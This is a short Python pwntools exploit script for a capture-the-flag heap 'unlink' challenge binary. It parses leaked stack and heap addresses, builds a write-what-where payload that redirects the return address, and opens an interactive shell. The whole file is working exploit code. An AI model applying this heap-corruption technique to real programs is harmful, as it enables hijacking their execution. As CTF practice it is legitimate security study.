```py
#!/usr/bin/python
from pwn import *
import struct

# Offsets
stack_offset = 0x2c
heap_offset = 0x8
proc = process("/root/CTF/unlink-ctf/unlink")

# Get Stack Address
proc.recvuntil("leak: ")
stack = proc.recvline().replace("\n", '')
stack_address = int(stack, 16)

# Get Heap Address
proc.recvuntil("leak: ")
heap = proc.recvline().replace("\n", '')
heap_address = int(heap, 16)

# Adjusted Values
heap_adj = struct.pack(">I", heap_address + heap_offset)
stack_adj = struct.pack(">I", stack_address - stack_offset)

# Log
log.success("heap: %s stack: %s" % (heap, stack))
log.success(("heap_adj: %s stack_adj: %s" % (heap_adj.encode('hex'), stack_adj.encode('hex'))))

# Crash
eax = struct.pack("<I", (stack_address - 0x18)-4) # what
edx = struct.pack("<I", (heap_address + heap_offset + 0x8)) # where
shell = struct.pack("<I", (heap_address + heap_offset + 0x8 + 0x4))
eip = struct.pack("<I", 0x080484eb)

log.success("where EDX: %s | %s" % (edx.encode('hex'), struct.pack(">I", (heap_address + heap_offset)).encode('hex')))
log.success("what EAX: %s | %s" % (eax.encode('hex'), struct.pack(">I", (stack_address - 0x18)-4).encode('hex')))

#Go
padding = "A"*4 + shell + eip + "D"*4
proc.sendline(padding + edx + eax)
proc.interactive()
```